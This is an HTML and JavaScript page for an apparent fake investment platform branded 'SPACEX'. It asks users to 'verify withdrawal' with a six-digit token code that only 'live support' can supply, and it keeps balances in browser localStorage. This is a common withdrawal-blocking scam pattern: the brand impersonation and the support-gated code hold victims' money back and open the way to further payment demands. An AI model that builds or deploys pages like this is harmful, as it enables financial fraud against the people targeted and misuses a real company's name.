<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <script src="runtime-config.js"></script>
    <title>SPACEX — Verify Withdrawal</title>
    <style>
      * {
        box-sizing: border-box;
      }
      html,
      body {
        margin: 0;
        background: #000;
        color: #fff;
        font-family:
          -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial,
          sans-serif;
      }
      body {
        min-height: 100dvh;
        display: grid;
        place-items: center;
        padding: 24px;
      }
      h1 {
        margin: 0 0 10px;
        font-size: 40px;
        text-align: center;
        font-weight: 700;
      }
      .lead {
        text-align: center;
        color: #ddd;
        margin: 0 0 28px;
        font-size: 18px;
      }
      .card {
        width: min(520px, 100%);
        border: 1px solid #3a3a3a;
        border-radius: 16px;
        padding: 28px 26px;
      }
      .lab {
        font-size: 16px;
        font-weight: 600;
        margin: 0 0 14px;
      }
      .boxes {
        display: flex;
        gap: 10px;
        justify-content: space-between;
      }
      .boxes input {
        width: 64px;
        height: 64px;
        text-align: center;
        font-size: 26px;
        font-weight: 700;
        border: 1px solid #fff;
        border-radius: 10px;
        background: #000;
        color: #fff;
        outline: none;
      }
      hr {
        border: 0;
        border-top: 1px solid #2a2a2a;
        margin: 22px 0;
      }
      .go {
        width: 100%;
        height: 54px;
        margin-top: 16px;
        border: 0;
        border-radius: 10px;
        background: #fff;
        color: #000;
        font-size: 18px;
        font-weight: 700;
        cursor: pointer;
      }
      .help {
        text-align: center;
        color: #cfcfcf;
        margin: 18px 0 8px;
        font-size: 15px;
      }
      .req {
        display: block;
        text-align: center;
        color: #fff;
        font-size: 16px;
      }
      .err {
        color: #f87171;
        text-align: center;
        min-height: 20px;
        margin-top: 10px;
        font-size: 14px;
      }
      .foot {
        display: flex;
        justify-content: center;
        gap: 10px;
        margin-top: 28px;
        color: #bdbdbd;
        font-size: 14px;
      }
    </style>
  </head>
  <body>
    <div>
      <h1>Verify Withdrawal</h1>
      <p class="lead">Contact live support to get a code</p>
      <form class="card" id="form">
        <p class="lab">Token Code</p>
        <div class="boxes">
          <input id="d0" maxlength="1" inputmode="numeric" />
          <input id="d1" maxlength="1" inputmode="numeric" />
          <input id="d2" maxlength="1" inputmode="numeric" />
          <input id="d3" maxlength="1" inputmode="numeric" />
          <input id="d4" maxlength="1" inputmode="numeric" />
          <input id="d5" maxlength="1" inputmode="numeric" />
        </div>
        <hr />
        <button class="go" type="submit">Confirm Token</button>
        <p class="err" id="err"></p>
        <p class="help">Contact live support to get a one time token code</p>
        <a class="req" href="#" id="req">Request token</a>
      </form>
      <p class="foot">
        <svg
          width="16"
          height="16"
          fill="none"
          stroke="currentColor"
          stroke-width="1.7"
        >
          <rect x="3" y="7" width="10" height="7" rx="1.5" />
          <path d="M6 7V5a2 2 0 0 1 4 0v2" />
        </svg>
        This step protects your account. Never share your token code with
        anyone.
      </p>
    </div>
    <script>
      function get() {
        try {
          return JSON.parse(
            localStorage.getItem("spacex.v1") || '{"users":[],"session":null}',
          );
        } catch (e) {
          return { users: [], session: null };
        }
      }
      function save(d) {
        localStorage.setItem("spacex.v1", JSON.stringify(d));
      }
      var db = get(),
        me = null;
      for (var i = 0; i < (db.users || []).length; i++) {
        if (
          String(db.users[i].email || "").toLowerCase() ===
          String(db.session || "").toLowerCase()
        )
          me = db.users[i];
      }
      if (!me) window.location.href = "login.html";
      if (me && !(me.isAdmin || me.role === "ADMIN") && me.kyc !== "verified")
        window.location.href = "withdraw.html";
      var boxes = [0, 1, 2, 3, 4, 5].map(function (i) {
        return document.getElementById("d" + i);
      });
      function digits() {
        return boxes
          .map(function (el) {
            return el.value;
          })
          .join("");
      }
      boxes.forEach(function (el, i) {
        el.addEventListener("input", function () {
          el.value = el.value.replace(/\D/g, "").slice(-1);
          if (el.value && i < 5) boxes[i + 1].focus();
        });
        el.addEventListener("keydown", function (e) {
          if (e.key === "Backspace" && !el.value && i > 0) boxes[i - 1].focus();
        });
      });
      document.getElementById("req").onclick = function (e) {
        e.preventDefault();
        if (window.openLiveChat) window.openLiveChat();
        else window.__openLiveChatRequested = true;
      };
      document.getElementById("form").onsubmit = function (e) {
        e.preventDefault();
        var code = digits();
        var err = document.getElementById("err");
        err.textContent = "";
        if (code.length !== 6) {
          err.textContent = "Enter the 6-digit code";
          return;
        }
        db = get();
        for (var i = 0; i < db.users.length; i++) {
          if (
            String(db.users[i].email || "").toLowerCase() ===
            String(me.email || "").toLowerCase()
          )
            me = db.users[i];
        }
        var real = String(me.withdrawToken || "");
        if (!real || code !== real) {
          err.textContent = "Wrong token code. Contact live support.";
          return;
        }
        var w = {};
        try {
          w = JSON.parse(sessionStorage.getItem("spacex-withdraw") || "{}");
        } catch (x) {}
        var amt = Number(w.amount) || 0;
        if (amt <= 0) {
          err.textContent = "No withdrawal amount found. Start again.";
          return;
        }
        if (amt > (Number(me.balance) || 0)) {
          err.textContent = "Not enough balance";
          return;
        }
        me.withdrawals = me.withdrawals || [];
        me.withdrawals.push({
          id: Date.now(),
          at: Date.now(),
          amount: amt,
          dest: w.dest || w.type || "",
          type: w.type || w.dest || "",
          coin: w.coin || "",
          address: w.address || "",
          bankName: w.bankName || "",
          accountName: w.accountName || "",
          accountNumber: w.accountNumber || "",
          kind: "withdrawal",
          status: "pending",
        });
        save(db);
        sessionStorage.removeItem("spacex-withdraw");
        window.location.href = "transactions.html";
      };
      (function () {
        var script = document.createElement("script");
        script.src = "livechat-loader.js";
        script.async = false;
        document.body.appendChild(script);
      })();
      boxes[0].focus();
    </script>
  </body>
</html>
